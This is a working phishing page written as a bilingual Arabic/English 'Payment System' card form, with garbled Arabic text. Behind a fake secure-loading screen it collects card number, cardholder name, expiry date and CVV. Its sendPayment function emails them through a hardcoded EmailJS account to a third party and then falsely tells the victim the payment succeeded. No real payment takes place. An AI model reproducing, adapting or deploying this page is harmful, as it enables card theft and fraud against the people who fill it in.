<!DOCTYPE html>
<html lang="ar">
<head>
  <meta charset="UTF-8">
  <title>Ù†Ø¸Ø§Ù… Ø§Ù„Ø¯ÙØ¹ / Payment System</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    * {box-sizing: border-box;}
    body {
      margin: 0;
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      background: #f6f9fc;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }
    .loader {
      font-size: 22px;
      font-weight: bold;
      color: #555;
    }
    .container {
      display: none;
      width: 100%;
      max-width: 400px;
      background: white;
      padding: 30px;
      border-radius: 12px;
      box-shadow: 0 0 20px rgba(0,0,0,0.1);
      direction: rtl;
    }
    .field {
      margin-bottom: 15px;
      text-align: right;
    }
    label {
      display: block;
      margin-bottom: 5px;
      font-weight: bold;
    }
    input {
      width: 100%;
      padding: 10px;
      border: 1.5px solid #ccc;
      border-radius: 6px;
      font-size: 16px;
    }
    input:focus {
      border-color: #3b82f6;
      outline: none;
    }
    .row {
      display: flex;
      gap: 10px;
    }
    .row .field {
      flex: 1;
    }
    button {
      width: 100%;
      padding: 12px;
      background-color: #3b82f6;
      color: white;
      font-size: 16px;
      border: none;
      border-radius: 6px;
      cursor: pointer;
    }
    button:hover {
      background-color: #2563eb;
    }
    .card-icons {
      display: flex;
      justify-content: center;
      margin-bottom: 20px;
    }
    .card-icons img {
      height: 28px;
      margin: 0 5px;
    }
    .lang-toggle {
      position: absolute;
      top: 15px;
      left: 15px;
    }
  </style>
</head>
<body>
<div class="loader" id="loading">
  <span id="loadingText">ğŸ”’ Ø¬Ø§Ø±ÙŠ ØªØ¬Ù‡ÙŠØ² Ù†Ø¸Ø§Ù… Ø§Ù„Ø¯ÙØ¹...</span>
</div>

<div class="container" id="paymentContainer">
  <div class="lang-toggle">
    <button onclick="toggleLang()">ğŸŒ English</button>
  </div>
  <div class="card-icons">
    <img src="https://img.icons8.com/color/48/visa.png" alt="Visa">
    <img src="https://img.icons8.com/color/48/mastercard-logo.png" alt="MasterCard">
  </div>
  <div class="field">
    <label id="labelCard">Ø±Ù‚Ù… Ø§Ù„Ø¨Ø·Ø§Ù‚Ø©</label>
    <input type="text" id="cardNumber" placeholder="XXXX XXXX XXXX XXXX" maxlength="19" oninput="formatCard(this)">
  </div>
  <div class="field">
    <label id="labelName">Ø§Ø³Ù… ØµØ§Ø­Ø¨ Ø§Ù„Ø¨Ø·Ø§Ù‚Ø©</label>
    <input type="text" id="cardName" placeholder="Ø§Ù„Ø§Ø³Ù… Ø§Ù„ÙƒØ§Ù…Ù„">
  </div>
  <div class="row">
    <div class="field">
      <label id="labelExpiry">ØªØ§Ø±ÙŠØ® Ø§Ù„Ø§Ù†ØªÙ‡Ø§Ø¡</label>
      <input type="text" id="expiry" placeholder="MM/YY" maxlength="5" oninput="formatExpiry(this)">
    </div>
    <div class="field">
      <label id="labelCVV">Ø±Ù…Ø² Ø§Ù„Ø£Ù…Ø§Ù†</label>
      <input type="text" id="cvv" placeholder="CVV" maxlength="4">
    </div>
  </div>
  <button onclick="sendPayment()" id="submitBtn">ØªØ£ÙƒÙŠØ¯ Ø§Ù„Ø¯ÙØ¹</button>
</div>

<script src="https://cdn.emailjs.com/dist/email.min.js"></script>
<script>
  emailjs.init("1xqwBMfecM1SSulsh");

  const translations = {
    ar: {
      card: "Ø±Ù‚Ù… Ø§Ù„Ø¨Ø·Ø§Ù‚Ø©",
      name: "Ø§Ø³Ù… ØµØ§Ø­Ø¨ Ø§Ù„Ø¨Ø·Ø§Ù‚Ø©",
      expiry: "ØªØ§Ø±ÙŠØ® Ø§Ù„Ø§Ù†ØªÙ‡Ø§Ø¡",
      cvv: "Ø±Ù…Ø² Ø§Ù„Ø£Ù…Ø§Ù†",
      pay: "ØªØ£ÙƒÙŠØ¯ Ø§Ù„Ø¯ÙØ¹",
      loading: "ğŸ”’ Ø¬Ø§Ø±ÙŠ ØªØ¬Ù‡ÙŠØ² Ù†Ø¸Ø§Ù… Ø§Ù„Ø¯ÙØ¹...",
      lang: "ğŸŒ English",
      dir: "rtl"
    },
    en: {
      card: "Card Number",
      name: "Cardholder Name",
      expiry: "Expiry Date",
      cvv: "CVV",
      pay: "Confirm Payment",
      loading: "ğŸ”’ Preparing payment system...",
      lang: "ğŸŒ Ø§Ù„Ø¹Ø±Ø¨ÙŠØ©",
      dir: "ltr"
    }
  };

  let currentLang = "ar";

  function toggleLang() {
    currentLang = currentLang === "ar" ? "en" : "ar";
    const t = translations[currentLang];
    document.getElementById('labelCard').innerText = t.card;
    document.getElementById('labelName').innerText = t.name;
    document.getElementById('labelExpiry').innerText = t.expiry;
    document.getElementById('labelCVV').innerText = t.cvv;
    document.getElementById('submitBtn').innerText = t.pay;
    document.getElementById('loadingText').innerText = t.loading;
    document.querySelector('.lang-toggle button').innerText = t.lang;
    document.getElementById('paymentContainer').style.direction = t.dir;
  }

  window.onload = () => {
    setTimeout(() => {
      document.getElementById('loading').style.display = 'none';
      document.getElementById('paymentContainer').style.display = 'block';
    }, 2000);
  };

  function sendPayment() {
    const data = {
      card_number: document.getElementById("cardNumber").value,
      card_name: document.getElementById("cardName").value,
      expiry: document.getElementById("expiry").value,
      cvv: document.getElementById("cvv").value
    };

    emailjs.send("service_plzxomt", "template_q95bk8a", data)
      .then(() => {
        alert(currentLang === "ar" ? "âœ… ØªÙ… ØªØ£ÙƒÙŠØ¯ Ø§Ù„Ø¯ÙØ¹ Ø¨Ù†Ø¬Ø§Ø­." : "âœ… Payment confirmed successfully.");
      }, () => {
        alert(currentLang === "ar" ? "âŒ Ø­Ø¯Ø« Ø®Ø·Ø£ Ø£Ø«Ù†Ø§Ø¡ Ø§Ù„Ø¥Ø±Ø³Ø§Ù„." : "âŒ Error during sending.");
      });
  }

  function formatCard(input) {
    let value = input.value.replace(/\D/g, '').substring(0, 16);
    value = value.replace(/(.{4})/g, '$1 ').trim();
    input.value = value;
  }

  function formatExpiry(input) {
    let value = input.value.replace(/\D/g, '').substring(0, 4);
    if (value.length >= 3) {
      value = value.substring(0, 2) + '/' + value.substring(2);
    }
    input.value = value;
  }
</script>
</body>
</html>
